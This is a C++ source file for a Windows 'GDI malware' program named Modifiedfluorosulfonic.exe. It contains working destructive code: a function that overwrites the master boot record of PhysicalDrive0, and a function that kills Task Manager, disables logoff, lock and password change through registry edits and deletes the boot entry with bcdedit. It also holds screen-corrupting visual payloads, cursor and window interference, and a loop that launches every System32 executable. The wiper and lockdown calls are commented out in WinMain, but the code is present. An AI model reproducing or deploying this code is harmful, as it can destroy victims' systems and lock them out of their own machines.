﻿#include "main.h"
#include "sound.h"
#include <cstdlib>
#include "bootheader.h"
#include "Hardshutdown.h"
//Message
//Modified With Null_Y317K She make the MBR and the Hard BSOD
DWORD WINAPI msg(LPVOID lpParam)
{
	for (int i = 0; i < INFINITE; i++)
	{
		MessageBox(NULL, TEXT("               Enter text here               "), TEXT("Text"), MB_CANCELTRYCONTINUE | MB_ICONERROR);
		std::cout << "i = " << i << std::endl;
	}
	return 0;
}

DWORD WINAPI MBRWiper(LPVOID lpParam) {
	DWORD dwBytesWritten;
	HANDLE hDevice = CreateFileW(
		L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
		FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
		OPEN_EXISTING, 0, 0);

	WriteFile(hDevice, MasterBootRecord, 32768, &dwBytesWritten, 0);
	return 1;
}
DWORD WINAPI NoTaskmgr(LPVOID lpParam) {
	system("taskkill /f /im taskmgr.exe");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableTaskMgr /t reg_dword /d 1 /f");
	system("REG ADD hkcu\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer /v NoRun /t reg_dword /d 1 /f");
	system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v HideFastUserSwitching /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer /v NoLogoff /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableLockWorkstation /t REG_DWORD /d 1 /f");
	system("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableChangePassword /t REG_DWORD /d 1 /f");
	system("bcdedit /delete {current}");
	return 1;
}
//Default GDI

DWORD WINAPI garbled(LPVOID lpParam) {
	const char* alphanum[] = {
		"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "q", "w", "e", "r", "t",
		"z", "u", "i", "o", "p", "a", "s", "d", "f", "g", "h", "j", "k", "l", "y",
		"x", "c", "v", "b", "n", "m", "Q", "W", "E", "R", "T", "Z", "U", "I", "O",
		"P", "A", "S", "D", "F", "G", "H", "J", "K", "L", "Y", "X", "C", "V", "B",
		"N", "M", ".", ",", " ", "$", "#", "&", "@", "!", "?",
	};
	int nText = sizeof(alphanum) / sizeof(void *);

	char text[1];

	while (true) {
		for (int i = 0; i < 70; i++) {
			text[i] = rand() % nText;
		}

		SetWindowTextA(GetForegroundWindow(), text);
		Sleep(10);
	}
}

//GDI Designation

//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\//\\

//payload1

DWORD WINAPI Buttons(LPVOID lpstart) {
	while (true) {
		HWND hwnd = GetForegroundWindow();

		EnableMenuItem(GetSystemMenu(hwnd, 0), SC_CLOSE, MF_BYCOMMAND | MF_DISABLED | MF_GRAYED);

		SetWindowLongA(hwnd, GWL_STYLE, GetWindowLongA(hwnd, GWL_STYLE) & ~WS_MINIMIZEBOX);

		SetWindowLongA(hwnd, GWL_STYLE, GetWindowLongA(hwnd, GWL_STYLE) & ~WS_MAXIMIZEBOX);
		Sleep(10);
	}
}

DWORD WINAPI gdi1(LPVOID lpParam)
{
	HWND upWnd = GetForegroundWindow();
	HDC upHdc = GetDC(upWnd);
	HDC desktop = GetDC(NULL);
	HDC desk = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	for (int i = 0;; i++)
	{
		upWnd = GetForegroundWindow();
		upHdc = GetDC(upWnd);
		desktop = GetDC(NULL);
		int(a) = rand() % w, b = rand() % h;
		BitBlt(desk, a, b, 250, 250, desk, a + rand() % 40 - 20, b + rand() % 40 - 20, SRCCOPY);
		Sleep(1);
	}
}

DWORD WINAPI gdi2(LPVOID lpParam)
{
	HDC desk = GetDC(HWND_DESKTOP);
	int X = GetSystemMetrics(SM_CXSCREEN);
	int Y = GetSystemMetrics(SM_CYSCREEN);

	while (true)
	{
		SelectObject(desk, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
		BitBlt(desk, rand() % (X - 0), rand() % (Y - 0), rand() % (X - 0), rand() % (Y - 0), desk, rand() % (X - 0), rand() % (Y - 0), PATINVERT);
		Sleep(1000);
	}
}

DWORD WINAPI gdi3(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	for (int i = 0;; i++)
	{
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		BitBlt(desk, 10, ry, sw, rand() % 5, desk, 0, ry, SRCCOPY);
		BitBlt(desk, -10, ry, sw, -rand() % 5, desk, 0, ry, SRCCOPY);
		Sleep(0);
	}
}

//payload2

DWORD WINAPI gdi4(LPVOID lpParam)
{
	int wDest;
	int iVar1;
	HDC hdcDest;
	int hDest;

	wDest = GetSystemMetrics(0);
	iVar1 = GetSystemMetrics(1);
	hdcDest = GetDC((HWND)0x0);
	do
	{
		do
		{
			hDest = 0;
		} while (iVar1 < 1);
		do
		{
			SelectObject(hdcDest, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
			StretchBlt(hdcDest, 0, 0, wDest, hDest, hdcDest, 0, 0, 1, 1, PATINVERT);
			Sleep(25);
			hDest = hDest + 6;
		} while (hDest < iVar1);
	} while (true);
}

DWORD WINAPI gdi5(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	LPCSTR text = 0;
	while (1)
	{
		desk = GetDC(0);
		text = "RIP PC";
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, RGB(0, 0, 0));
		HFONT font = CreateFontA(37.5, 31.25, 0, 0, FW_THIN, 0, 25, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
		SelectObject(desk, font);
		TextOutA(desk, rand() % sw, rand() % sh, text, strlen(text));
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
		DeleteObject(font);
		Sleep(75);
	}
}

DWORD WINAPI gdi6(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1)
	{
		LineTo(desk, rand() % xs, rand() % ys);
		Sleep(1);
	}
}

//payload3

DWORD WINAPI gdi7(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	double angle = 0;
	while (1)
	{
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.f)
		{
			int a = sin(angle) * 10;
			BitBlt(desk, i, 0, 1, sh, desk, i, a, SRCCOPY);
			angle += M_PI / 75;
			DeleteObject(&i);
			DeleteObject(&a);
			Sleep(1);
		}
		ReleaseDC(wnd, desk);
		DeleteDC(desk);
		DeleteObject(wnd);
		DeleteObject(&sw);
		DeleteObject(&sh);
		DeleteObject(&angle);
	}
}

DWORD WINAPI gdi8(LPVOID lpParam)
{
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	RGBQUAD* data = (RGBQUAD*)VirtualAlloc(0, (w * h + w) * sizeof(RGBQUAD), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	HDC hdc, hdcMem; HBITMAP hbm;
	for (int i = 0;; i++, i %= 6)
	{
		hdc = GetDC(0); hdcMem = CreateCompatibleDC(hdc);
		hbm = CreateBitmap(w, h, 1, 32, data);
		SelectObject(hdcMem, hbm);
		BitBlt(hdcMem, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(hbm, w * h * 4, data);
		for (int i = 0; w * h > i; i++) {
			int x = i * w + i, y = i * h + i, f = (y | y + y + -1 + x + w / h);
			((BYTE*)(data + i))[4] = 0;
		}
		SetBitmapBits(hbm, w * h * 4, data);
		BitBlt(hdc, 0, 0, w, h, hdcMem, 0, 0, SRCINVERT);
		DeleteObject(hbm);
		DeleteObject(hdcMem);
		DeleteObject(hdc);
		Sleep(750);
	}
}

//payload4

DWORD  WINAPI gdi9(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	while (1)
	{
		desk = GetDC(0);
		rx = rand() % sw;
		int ry = rand() % sh;
		SelectObject(desk, CreateSolidBrush(RGB(500, 0, 0)));
		BitBlt(desk, rand() % 2, rand() % 2, sw, sh, desk, rand() % 2, rand() % 2, RGBBRUSH);
		BitBlt(desk, rx, 1, 50, sh, desk, rx, 0, SRCPAINT);
		Sleep(1);
	}
}

DWORD WINAPI gdi10(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int xs = GetSystemMetrics(0), ys = GetSystemMetrics(1);
	while (1)
	{
		LineTo(desk, rand() % xs, rand() % ys);
		Sleep(1);
	}
}

//payload5

DWORD WINAPI gdi11(LPVOID lpParam)
{
	int uVar1;
	ulonglong uVar2;
	uint uVar3;
	uint uVar4;
	HDC hdc;
	HPEN h;
	int right;
	uint uVar5;
	int top;
	int bottom;
	int left;
	int local_28;
	int local_1c;
	HBRUSH local_14;
	int local_10;
	uint local_c;
	uint local_8;

	uVar3 = GetSystemMetrics(0);
	uVar4 = GetSystemMetrics(1);
	hdc = GetDC((HWND)0x0);
	uVar1 = rdtsc();
	uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
	uVar5 = uVar5 ^ uVar5 << 0xffffff;
	local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
	uVar1 = rdtsc();
	uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
	uVar5 = uVar5 ^ uVar5 << 0xffffff;
	local_c = (uVar5 << 5 ^ uVar5) % uVar4;
	local_14 = CreateSolidBrush(0xffffff);
	h = CreatePen(0, 5, 0x0);
	local_28 = 0;
	do
	{
		if (local_28 == 1)
		{
			local_14 = CreateSolidBrush(0xffffff);
		}
		SelectObject(hdc, local_14);
		SelectObject(hdc, h);
		if (((((int)uVar3 <= (int)local_8) || ((int)uVar4 <= (int)local_c)) || ((int)local_8 < 1)) || ((int)local_c < 1))
		{
			uVar1 = rdtsc();
			uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			local_8 = (uVar5 << 5 ^ uVar5) % uVar3;
			uVar1 = rdtsc();
			uVar5 = (uint)uVar1 ^ (uint)uVar1 << 0xd;
			uVar5 = uVar5 ^ uVar5 << 0x11;
			local_c = (uVar5 << 5 ^ uVar5) % uVar4;
		}
		uVar2 = rdtsc();
		left = local_8 - 0x3c;
		top = local_c - 0x3c;
		uVar5 = (uint)uVar2 & 3;
		right = local_8 + 0x3c;
		bottom = local_c + 0x3c;
		local_1c = 10;
		local_10 = right;
		do
		{
			if ((uVar2 & 3) == 0)
			{
				Rectangle(hdc, left, top, right, bottom);
				local_8 = local_8 + 0x14;
				left = left + 0x14;
				local_10 = local_10 + 0x14;
				bottom = bottom + 0x14;
				local_c = local_c + 0x14;
				top = top + 0x14;
			LAB_004020f7:
				Sleep(1);
				right = local_10;
			}
			else
			{
				if (uVar5 == 1)
				{
					Rectangle(hdc, left, top, right, bottom);
					local_8 = local_8 + 0x14;
					local_10 = local_10 + 0x14;
					left = left + 0x14;
				LAB_004020ed:
					local_c = local_c - 0x14;
					bottom = bottom + -0x14;
					top = top + -0x14;
					goto LAB_004020f7;
				}
				if (uVar5 == 2)
				{
					Rectangle(hdc, left, top, right, bottom);
					local_8 = local_8 - 0x14;
					left = left + -0x14;
					local_10 = local_10 + -0x14;
					bottom = bottom + 0x14;
					local_c = local_c + 0x14;
					top = top + 0x14;
					goto LAB_004020f7;
				}
				if (uVar5 == 3)
				{
					Rectangle(hdc, left, top, right, bottom);
					local_8 = local_8 - 0x14;
					local_10 = local_10 + -0x14;
					left = left + -0x14;
					goto LAB_004020ed;
				}
			}
			local_1c = local_1c + -1;
		} while (local_1c != 0);
		local_28 = local_28 + 1;
	} while (true);
}

DWORD WINAPI gdi12(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0);
	int sh = GetSystemMetrics(1);
	double angle = 0;
	while (1)
	{
		desk = GetDC(0);
		for (float i = 0; i < sw + sh; i += 1.f)
		{
			int a = sin(angle) * 20;
			BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
			BitBlt(desk, i, 0, 1, sh, desk, i, a, SRCCOPY);
			angle += 50 / 4;
			DeleteObject(&i);
			DeleteObject(&a);
			Sleep(5);
		}
		ReleaseDC(wnd, desk);
		DeleteDC(desk);
		DeleteObject(wnd);
		DeleteObject(&sw);
		DeleteObject(&sh);
		DeleteObject(&angle);
	}
}

DWORD  WINAPI gdi13(LPVOID lpParam)
{
	while (1)
	{
		POINT mouse;
		int x;
		int y;
		GetCursorPos(&mouse);
		x = mouse.x;
		y = mouse.y;
		SetCursorPos(x + rand() % 2 + rand() % 2, y + rand() % 2 + rand() % 2);
		Sleep(25);
		SetCursorPos(x - rand() % 2 + rand() % 2, y - rand() % 2 + rand() % 2);
		Sleep(25);
	}
}

//payload6

DWORD WINAPI gdi14(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	for (int i = 0;; i++)
	{
		int(a) = rand() % w, b = rand() % h;
		BitBlt(desk, a, b, 500, 500, desk, a + rand() % 40 - 20, b + 0, SRCCOPY);
		Sleep(0);
	}
}

DWORD WINAPI gdi15(LPVOID lpParam)
{
	HDC hbc = GetDC(NULL);
	int w, h;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (true)
	{
		w = 0, h = rand() % sh;
		SelectObject(hbc, CreateSolidBrush(RGB(rand() % 500, rand() % 500, rand() % 500)));
		PatBlt(hbc, w, h, sw, rand() % 100, PATCOPY);
		Sleep(25);
	}
}

//payload7

DWORD WINAPI gdi16(LPVOID lpParam)
{
	HWND v3;
	HBITMAP h;
	HDC hdcSrc;
	HDC hdc;
	void* lpvBits;
	int nHeight;
	int nWidth;
	DWORD v12;
	int j;
	int v14;
	int i;
	v12 = GetTickCount();
	nWidth = GetSystemMetrics(0);
	nHeight = GetSystemMetrics(1);
	lpvBits = VirtualAlloc(0, 4 * nWidth * (nHeight + 1), 0x3000u, 4u);
	for (i = 0; ; i = (i + 1) % 2)
	{
		hdc = GetDC(0);
		hdcSrc = CreateCompatibleDC(hdc);
		h = CreateBitmap(nWidth, nHeight, 1u, 0x20u, lpvBits);
		SelectObject(hdcSrc, h);
		BitBlt(hdcSrc, 0, 0, nWidth, nHeight, hdc, 0, 0, SRCCOPY);
		GetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		v14 = 0;
		if (GetTickCount() - v12 > 0xA)
			rand();
		for (j = 0; nHeight * nWidth > j; ++j)
		{
			if (!(j % nHeight) && !(rand() % 10))
				v14 = rand() % 2;
			*((BYTE*)lpvBits + 4 * j + v14) -= 5;
		}
		SetBitmapBits(h, 4 * nHeight * nWidth, lpvBits);
		BitBlt(hdc, 0, 0, nWidth, nHeight, hdcSrc, 0, 0, SRCCOPY);
		DeleteObject(h);
		DeleteObject(hdcSrc);
		DeleteObject(hdc);
		Sleep(1);
	}
}

//payload8

DWORD WINAPI gdi17(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN);
	int rx;
	POINT cursorPt;
	LPCSTR text = 0;
	while (1)
	{
		desk = GetDC(0);
		SeedXorshift32(__rdtsc());
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		StretchBlt(desk, 0, 0, sw, sh, desk, rx, ry, 100, 100, SRCINVERT);
		GetCursorPos(&cursorPt);
		text = "fluorosulfonic";
		SetBkMode(desk, TRANSPARENT);
		SetTextColor(desk, RGB(rand() % 500, rand() % 500, rand() % 500));
		HFONT font = CreateFontA(50, 25, 0, 0, FW_THIN, 0, 50, 0, ANSI_CHARSET, 0, 0, 0, 0, "Shadows Into Light");
		SelectObject(desk, font);
		TextOutA(desk, cursorPt.x, cursorPt.y, text, strlen(text));
		ReleaseDC(GetDesktopWindow(), desk);
		DeleteDC(desk);
		DeleteObject(font);
		Sleep(25);
	}
}

//payload9

DWORD WINAPI gdi18(LPVOID lpParam)
{
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(SM_CXSCREEN), sh = GetSystemMetrics(SM_CYSCREEN), xSize = sh / 10, ySize = 9;
	while (1)
	{
		HDC desk = GetDC(0);
		for (int i = 0; i < sh * 2; i++)
		{
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(desk, i, 0, 1, sh, desk, i, wave, SRCCOPY);
		}
		for (int i = 0; i < sw * 2; i++)
		{
			int wave = sin(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(desk, 0, i, sw, 1, desk, wave, i, SRCCOPY);
		}
	}
}

DWORD WINAPI gdi19(LPVOID lpParam)
{
	HDC desk = GetWindowDC(GetDesktopWindow());
	int x = rand() % GetSystemMetrics(SM_CXSCREEN), y = rand() % GetSystemMetrics(SM_CYSCREEN);
	while (true)
	{
		FreeConsole();
		x = GetSystemMetrics(SM_CXSCREEN);
		y = GetSystemMetrics(SM_CYSCREEN);
		DrawIcon(desk, rand() % x, rand() % y, LoadIcon(0, IDI_ERROR));
		DrawIcon(desk, rand() % x, rand() % y, LoadIcon(0, IDI_WARNING));
		DrawIcon(desk, rand() % x, rand() % y, LoadIcon(0, IDI_INFORMATION));
		DrawIcon(desk, rand() % x, rand() % y, LoadIcon(0, IDI_APPLICATION));
		Sleep(250);
	}
}
DWORD WINAPI WindowMax(LPVOID lpstart) {
	int x = GetSystemMetrics(SM_CXSCREEN);
	int y = GetSystemMetrics(SM_CYSCREEN);

	RECT rekt;

	while (true) {
		HWND hwnd = GetForegroundWindow();
		GetWindowRect(hwnd, &rekt);

		int sel = rand() % 4 + 1;

		if (rekt.left >= x) {
			rekt.left = 0;
		}
		else if (rekt.top >= y) {
			rekt.top = 0;
		}
		else if (rekt.left <= 0) {
			rekt.left = 0;
		}
		else if (rekt.top <= 0) {
			rekt.top = 0;
		}

		int xs = rekt.left;
		int ys = rekt.top;
		int rnd = rand() % 100 + 60;

		for (int i = 0; i < rnd; i += 20) {
			if (sel == 1) {
				SetWindowPos(hwnd, 0, xs + i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 2) {
				SetWindowPos(hwnd, 0, xs - i, ys + i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 3) {
				SetWindowPos(hwnd, 0, xs + i, ys - i, xs, ys, 0);
				Sleep(10);
			}
			else if (sel == 4) {
				SetWindowPos(hwnd, 0, xs - i, ys - i, xs, ys, 0);
				Sleep(10);
			}
		}
	}
}

DWORD WINAPI Programs(LPVOID lpstart) {
	WIN32_FIND_DATA data;
	LPCWSTR path = L"C:\\WINDOWS\\system32\\*.exe";

	while (true) {
		HANDLE find = FindFirstFileW(path, &data);

		ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);

		while (FindNextFileW(find, &data)) {
			ShellExecuteW(0, L"open", data.cFileName, 0, 0, SW_SHOW);
			Sleep(250);
		}
	}
}

void reg_add( //credits to Mist0090 because creating registry keys in C++ without sh*tty system() or reg.exe is hell
	HKEY HKey,
	LPCWSTR Subkey,
	LPCWSTR ValueName,
	unsigned long Type,
	unsigned int Value
)
{
	HKEY hKey;
	DWORD dwDisposition;
	LONG result;


	result = RegCreateKeyExW(
		HKey, //HKEY
		Subkey,
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS,
		NULL,
		&hKey,
		&dwDisposition);

	result = RegSetValueExW(
		hKey,
		ValueName,
		0,
		Type,
		(const unsigned char*)&Value,
		(int)sizeof(Value)
	);

	RegCloseKey(hKey);
	return;
}

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


int WINAPI WinMain(HINSTANCE a, HINSTANCE b, LPSTR c, int d)
{
	//WARNING

	if (MessageBoxW(NULL, L"Run GDI Only?", L"Modifiedfluorosulfonic.exe - !!!WARNING!!! ", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;

	if (MessageBoxW(NULL, L"Are You Sure?", L"Modifiedfluorosulfonic.exe - !!!FINAL WARNING!!!", MB_ICONWARNING | MB_YESNO) != IDYES)
		return false;
	//Default GDI

	//CreateThread(0, 0, MBRWiper, 0, 0, 0);
	//CreateThread(0, 0, NoTaskmgr, 0, 0, 0);
	//Sleep(1000);
	//reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
	//reg_add(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
	CreateThread(0, 0, msg, 0, 0, 0);
	Sleep(650);
	//CreateThread(0, 0, Buttons, 0, 0, 0);
	//HANDLE payload1123234 = CreateThread(0, 0, WindowMax, 0, 0, 0);
	CreateThread(0, 0, garbled, 0, 0, 0);
	sound1();
	HANDLE payload1 = CreateThread(0, 0, gdi1, 0, 0, 0);
	HANDLE payload1_2 = CreateThread(0, 0, gdi2, 0, 0, 0);
	Sleep(5000);
	HANDLE payload1_3 = CreateThread(0, 0, gdi3, 0, 0, 0);
	Sleep(15000);
	TerminateThread(payload1, 0);
	CloseHandle(payload1);
	TerminateThread(payload1_2, 0);
	CloseHandle(payload1_2);
	TerminateThread(payload1_3, 0);
	CloseHandle(payload1_3);
	RedrawWindow(0, 0, 0, 133);
	sound2();
	HANDLE payload2 = CreateThread(0, 0, gdi4, 0, 0, 0);
	HANDLE payload2_2 = CreateThread(0, 0, gdi5, 0, 0, 0);
	HANDLE payload2_3 = CreateThread(0, 0, gdi6, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload2, 0);
	CloseHandle(payload2);
	TerminateThread(payload2_2, 0);
	CloseHandle(payload2_2);
	TerminateThread(payload2_3, 0);
	CloseHandle(payload2_3);
	RedrawWindow(0, 0, 0, 133);
	sound3();
	HANDLE payload3 = CreateThread(0, 0, gdi7, 0, 0, 0);
	HANDLE payload3_2 = CreateThread(0, 0, gdi8, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload3, 0);
	CloseHandle(payload3);
	TerminateThread(payload3_2, 0);
	CloseHandle(payload3_2);
	RedrawWindow(0, 0, 0, 133);
	sound4();
	HANDLE payload4 = CreateThread(0, 0, gdi9, 0, 0, 0);
	HANDLE payload4_2 = CreateThread(0, 0, gdi10, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload4, 0);
	CloseHandle(payload4);
	TerminateThread(payload4_2, 0);
	CloseHandle(payload4_2);
	RedrawWindow(0, 0, 0, 133);
	sound5();
	HANDLE payload5 = CreateThread(0, 0, gdi11, 0, 0, 0);
	HANDLE payload5_2 = CreateThread(0, 0, gdi12, 0, 0, 0);
	HANDLE mouse = CreateThread(0, 0, gdi13, 0, 0, 0);
	//HANDLE payload1123234 = CreateThread(0, 0, WindowMax, 0, 0, 0);
	//HANDLE System32Programs = CreateThread(0, 0, Programs, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload5, 0);
	CloseHandle(payload5);
	TerminateThread(payload5_2, 0);
	CloseHandle(payload5_2);
	RedrawWindow(0, 0, 0, 133);
	sound6();
	HANDLE payload6 = CreateThread(0, 0, gdi14, 0, 0, 0);
	HANDLE payload6_2 = CreateThread(0, 0, gdi15, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload6, 0);
	CloseHandle(payload6);
	TerminateThread(payload6_2, 0);
	CloseHandle(payload6_2);
	RedrawWindow(0, 0, 0, 133);
	sound7();
	HANDLE payload7 = CreateThread(0, 0, gdi16, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload7, 0);
	CloseHandle(payload7);
	RedrawWindow(0, 0, 0, 133);
	sound8();
	HANDLE payload8 = CreateThread(0, 0, gdi17, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload8, 0);
	CloseHandle(payload8);
	RedrawWindow(0, 0, 0, 133);
	sound9();
	HANDLE payload9 = CreateThread(0, 0, gdi18, 0, 0, 0);
	HANDLE payload9_2 = CreateThread(0, 0, gdi19, 0, 0, 0);
	Sleep(20000);
	TerminateThread(payload9, 0);
	CloseHandle(payload9);
	TerminateThread(payload9_2, 0);
	CloseHandle(payload9_2);
	RedrawWindow(0, 0, 0, 133);
}